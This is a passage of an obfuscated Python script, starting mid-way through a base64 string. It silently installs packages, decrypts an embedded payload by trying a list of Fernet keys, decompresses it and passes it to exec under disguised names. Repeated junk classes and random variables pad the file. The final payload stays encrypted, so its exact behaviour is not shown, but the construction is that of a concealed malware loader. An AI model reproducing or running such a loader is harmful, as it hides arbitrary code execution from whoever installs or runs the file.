0IEZlcm5ldApleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBzdWJwcm9jZXNzLnJ1bigncHl0aG9uIC1tIHBpcCBpbnN0YWxsIGNyeXB0b2dyYXBoeScsIHNoZWxsPVRydWUpCiAgICBmcm9tIGNyeXB0b2dyYXBoeS5mZXJuZXQgaW1wb3J0IEZlcm5ldAoKaW1wb3J0IHN1YnByb2Nlc3MKcmVxdWlyZW1lbnRzID0gWwogICAgWyJyZXF1ZXN0cyIsICJyZXF1ZXN0cyJdLAogICAgWyJjcnlwdG9ncmFwaHkiLCAiY3J5cHRvZ3JhcGh5Il0KXQpmb3IgbW9kbCBpbiByZXF1aXJlbWVudHM6CiAgICB0cnk6IF9faW1wb3J0X18obW9kbFswXSkKICAgIGV4Y2VwdDoKICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKGV4ZWN1dGFibGUgKyAiIC1tIHBpcCBpbnN0YWxsIG1vZGxbMV0iLCBzaGVsbD1UcnVlKQogICAgICAgIHRpbWUuc2xlZXAoMykKCiAgICAKTW9kdWxlUmVxdWlyZW1lbnRzID0gW1siY3J5cHRvZ3JhcGh5IiwgImNyeXB0b2dyYXBoeSJdXQpmb3IgbW9kdWxlIGluIE1vZHVsZVJlcXVpcmVtZW50czoKICAgIHRyeTogICAgICAgIAogICAgICAgIF9faW1wb3J0X18obW9kdWxlWzBdKQogICAgZXhjZXB0OgogICAgICAgIHRyeToKICAgICAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihleGVjdXRhYmxlICsgIiAtbSBwaXAgaW5zdGFsbCBweWNyeXRvZG9tZSAtLXF1aWV0Iiwgc2hlbGw9VHJ1ZSkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oZXhlY3V0YWJsZSArICIgLW0gcGlwIGluc3RhbGwgQ3J5cHRvIC0tcXVpZXQiLCBzaGVsbD1UcnVlKQoKaW1wb3J0IHJlcXVlc3RzCgpmcm9tIGNyeXB0b2dyYXBoeS5mZXJuZXQgaW1wb3J0IEZlcm5ldCBhcyBiR3ZQeDRYTEJlRWJYV3pJd2tKQlBqWThVZ3FlenpzYWMxcEpISwplbmNvZGVkX2NvZGUgPSAiWjBGQlFVRkJRbTFFV1ZGQk9VaG1aVXhKU21SdmIwZHhNVmMwV2pKb2JVMUxTMjVoUWxoSFkwbDZNazlYWVRGNFFqYzNaM1pNYUVwU1IyaGZlbXhXY1dRM01tVlJRMFJ0ZGxJeU1UUkNaMVJYYUdNMU1pMWliMG80TkhkeVpITlVhM05uVERkWFJXZGFjRTlNYlZST2VuSTRWMHRNVGxwU1RHdDBUMDExTVZSbGJGVkZTazFOZURaNk0wTjRPVTl2YjFVeVMyMU9Xa2s0U0ZrdGFtVnFWVnBRYjFFeWJGVmtRM0Y0VkdNeVdtWmFlbHBpZVRkalUyUmZkblppVlZaV04zVjRMVWxNV0ZaNmNUQnpUa053Y1d4NFlUbDRjbEJGTm1wbVluWmxkWGhET0ZKaE1sQnBVWGxqVjBVeGJWaFRMVmxHU0ZGMk5EZFVjRlZVU1ROSFZUazJRVEExUWpSQ1pVUkRTVTVZVEVOb09VcGFjVEYzVmpjeFUyaG9iR04wVDFVMGVGZE9aVVJ0ZFVwR1gwSTNVRmxYV1RsNlkzaDBWR052U21sUWJWQTVOR3R3Y1c5M1ZsSjVUR3AzY1RGSlJEbENNMFpDVmxKck1ERjFUMXB5VURoVVVuRk9TMEpYU0hGRVMzZGtWemQ2UjJ0cVZrTjBOV3Q1YzE4eVUxOHRZMkpyT0hRMlIxYzFWVkF0UkROTGRtOVRlbkZSUm1wTmVpMWxRbWRrVEhGRlEwcFROM0o0UTIxWU5YZHlSa1ZQZEcxT1VtcGhOM1JQUmtWbWVIcDZjV0ZPYzFSMFZIRTROV0p1WTJodllVZGpPVVJWVDJ0MFJWTmpWak5rWkhkd1RtOUJhVGxEVVV0b2JXRnBiRkJ1VTJaQlpWVkJVa0poUW0xYWR6bFdWMjFzVlVsblJqbFROMWxQY0VJeFRGUlVSVGxoWkZCclNuaHdVM1F6YTA0MVJGTlpRWEJUWkcxRlNXTjJSMEZHUTFJd2RVNDFXVk53ZGxGQ2FXdzJSRzFmWlZwQlJWcFZaM042ZEhod2RXbFhZemhxWW0xblluVTNUa1ZEU1U1WmRVcHpaVmRSYkUwMGRIWklXbVoxUmxZMFFqRTFVMWgwYVVsUFdVNVhhR0p6UlRaR05IcDFaa3cwWkVrM1lRPT0iClZPUkFSeEZZUjJkclMxSFdGTlZMeEZGUVJJWk5JeVR4YzNleHQxID0gZXhlYwplbmNyeXB0ZWRfY29kZSA9IGJhc2U2NC5iNjRkZWNvZGUoZW5jb2RlZF9jb2RlKQpjbGFzcyBuN2NlWnhRclFJOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IEZhbHNlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQp7J3VzZXJuYW1lJzogJ2Y2azNVU3UnLCAnYWdlJzogNDB9CmNsYXNzIHRwUjVXTzhPQkE6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKJ2hpRHRSUHM4RFInClNES014V1VyR0ogPSAxODUxNTE0OQpjbGFzcyBxelBDTFVleGRiOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCmNsYXNzIE85Qm9CYVlybjg6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKTVpoNFNsUEFqcSA9IDk2MDY0MTgKY2xhc3MgS2QxRzRwOXBKTToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpPQlA2MWx2Z3U2ID0gNDUzNTgyMjIKRDh2RTh2djhkYiA9IDEyNjA3NTc3ClsiJ0JBcXgxbE82M0snIiwgIidEYmdYT0o4bFg2JyIsICInc2tFVGxSTHdweSciXQpjbGFzcyBsNVJNc2dPdWRGOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhClRMN09DMFVjR2EgPSA2MTE2Nzk1NgpXdXgwRmlsbWJYID0gNTc5Mjg5NzMKaEZCcGtHeHVkVCA9IDkyOTkxMzk5CmU2OTlvMmx0V3kgPSA4NzQ2OTczNwpvTEpueWlzUm01ID0gNjE0NzU2MzAKU3IxZjQxSE1BbSA9IDc1MzQ3NTg2CmNsYXNzIHduTURvdUoxQVE6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKY2xhc3MgZ2NDMnFUSldtRzoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBGYWxzZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKY2xhc3MgVndyMXR4Z0JzWDoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpjbGFzcyBOQlpEdzBpdTZZOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IEZhbHNlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpzID0gW2IndTBXRkJVdWJQWGd0WUdJYVdQcmU3bk1jYllUVDhFblREZDMzbXZhOWcwdz0nLCBiJ3RRMzVYV1dLd19IT2tHeUlXalZBcmNYU0s3emwwMV9mSjYtZDJTVHJ6c2c9JywgYidMQjJhRGYxZ01YZXhHLWNUdER1Q2QwWEY4UDdIRE1lX2dhc3o0NDBYRXJBPScsIGInNVFxMW83VkxWMFV6RkJ1andHVW5yd21RYkZZTEpPamYtZmZuRUw0dTFRVT0nLCBiJ25JY3NyQzUxbmUxaVRJMHBVTzB2S0tpRnAyN0JpdVBhaGNjb2JPeE1Cazg9JywgYid1VDJfU2l1Si1HenpYS1lpMUp1bGNEQzU1M1V4aHl5QlNXMmVoS3BnNl8wPScsIGInTnROWXIxOVNiZGZIb0hHdEZ4WU1yZEdKSGNlaUdSMXpUQ3d1ZkVVcS1jRT0nLCBiJzVyR0JPYUllTTZlV28zS292U0dJZkprMk9UVWtFdDByLUVPWGY2ZXl6YzQ9JywgYidqR3Y3QjNwWjVqNUhlYngyRFBPRFhwTnlMQkhfOEluSnVfaGFyRU1vc2ZrPScsIGInN3dqbjYtMFpXZ0U0TjZhUDF2UkMwN2RxNVFrNHZGVFJHbzl4Szl6WmdWST0nLCBiJ1Bkdk1RQUpwSHJ3TmtBaFc5REVMT3pKdk5aaXFrNDBJZElIVUhPQzI3Rkk9JywgYidXSUYzaU9QdHZ5RktXREZISktVb0phSjZQanRRZ0JVUUF3SHZXdFFzSnZBPSddCmZvciBrZXkgaW4gczoKICAgIHRyeToKICAgICAgICBkZWNyeXB0ZWRfY29kZSA9IGJHdlB4NFhMQmVFYlhXekl3a0pCUGpZOFVncWV6enNhYzFwSkhLKGtleS5kZWNvZGUoInV0Zi04IikpLmRlY3J5cHQoZW5jcnlwdGVkX2NvZGUpCiAgICAgICAgYnJlYWsKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwYXNzCmNsYXNzIG43Y2VaeFFyUUk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCnsndXNlcm5hbWUnOiAnZjZrM1VTdScsICdhZ2UnOiA0MH0KY2xhc3MgdHBSNVdPOE9CQToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQonaGlEdFJQczhEUicKU0RLTXhXVXJHSiA9IDE4NTE1MTQ5CmNsYXNzIHF6UENMVWV4ZGI6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKY2xhc3MgTzlCb0JhWXJuODoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpNWmg0U2xQQWpxID0gOTYwNjQxOApjbGFzcyBLZDFHNHA5cEpNOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCk9CUDYxbHZndTYgPSA0NTM1ODIyMgpEOHZFOHZ2OGRiID0gMTI2MDc1NzcKWyInQkFxeDFsTzYzSyciLCAiJ0RiZ1hPSjhsWDYnIiwgIidza0VUbFJMd3B5JyJdCmNsYXNzIGw1Uk1zZ091ZEY6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKVEw3T0MwVWNHYSA9IDYxMTY3OTU2Cld1eDBGaWxtYlggPSA1NzkyODk3MwpoRkJwa0d4dWRUID0gOTI5OTEzOTkKZTY5OW8ybHRXeSA9IDg3NDY5NzM3Cm9MSm55aXNSbTUgPSA2MTQ3NTYzMApTcjFmNDFITUFtID0gNzUzNDc1ODYKY2xhc3Mgd25NRG91SjFBUToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpjbGFzcyBnY0MycVRKV21HOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IEZhbHNlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpjbGFzcyBWd3IxdHhnQnNYOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCmNsYXNzIE5CWkR3MGl1Nlk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCmRlY29tcHJlc3NlZF9jb2RlID0gemxpYi5kZWNvbXByZXNzKGRlY3J5cHRlZF9jb2RlKS5kZWNvZGUoJ3V0Zi04JykKVk9SQVJ4RllSMmRyUzFIV0ZOVkx4RkZRUklaTkl5VHhjM2V4dDEoZGVjb21wcmVzc2VkX2NvZGUpCmNsYXNzIG43Y2VaeFFyUUk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCnsndXNlcm5hbWUnOiAnZjZrM1VTdScsICdhZ2UnOiA0MH0KY2xhc3MgdHBSNVdPOE9CQToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQonaGlEdFJQczhEUicKU0RLTXhXVXJHSiA9IDE4NTE1MTQ5CmNsYXNzIHF6UENMVWV4ZGI6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKY2xhc3MgTzlCb0JhWXJuODoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpNWmg0U2xQQWpxID0gOTYwNjQxOApjbGFzcyBLZDFHNHA5cEpNOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCk9CUDYxbHZndTYgPSA0NTM1ODIyMgpEOHZFOHZ2OGRiID0gMTI2MDc1NzcKWyInQkFxeDFsTzYzSyciLCAiJ0RiZ1hPSjhsWDYnIiwgIidza0VUbFJMd3B5JyJdCmNsYXNzIGw1Uk1zZ091ZEY6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKVEw3T0MwVWNHYSA9IDYxMTY3OTU2Cld1eDBGaWxtYlggPSA1NzkyODk3MwpoRkJwa0d4dWRUID0gOTI5OTEzOTkKZTY5OW8ybHRXeSA9IDg3NDY5NzM3Cm9MSm55aXNSbTUgPSA2MTQ3NTYzMApTcjFmNDFITUFtID0gNzUzNDc1ODYKY2xhc3Mgd25NRG91SjFBUToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpjbGFzcyBnY0MycVRKV21HOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IEZhbHNlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpjbGFzcyBWd3IxdHhnQnNYOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCmNsYXNzIE5CWkR3MGl1Nlk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCg=="
VORARxFYR2drS1HWFNVLxFFQRIZNIyTxc3ext1(base64.b64decode(zauIRIMszTiuVTLkvAfaEAo3fcZ9XtigEeHBY4))
class n7ceZxQrQI:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'f6k3USu', 'age': 40}
class tpR5WO8OBA:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'hiDtRPs8DR'
SDKMxWUrGJ = 18515149
class qzPCLUexdb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class O9BoBaYrn8:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
MZh4SlPAjq = 9606418
class Kd1G4p9pJM:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
OBP61lvgu6 = 45358222
D8vE8vv8db = 12607577
["'BAqx1lO63K'", "'DbgXOJ8lX6'", "'skETlRLwpy'"]
class l5RMsgOudF:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
TL7OC0UcGa = 61167956
Wux0FilmbX = 57928973
hFBpkGxudT = 92991399
e699o2ltWy = 87469737
oLJnyisRm5 = 61475630
Sr1f41HMAm = 75347586
class wnMDouJ1AQ:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class gcC2qTJWmG:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class Vwr1txgBsX:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class NBZDw0iu6Y:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data

if __name__ == '__main__':
    Init()
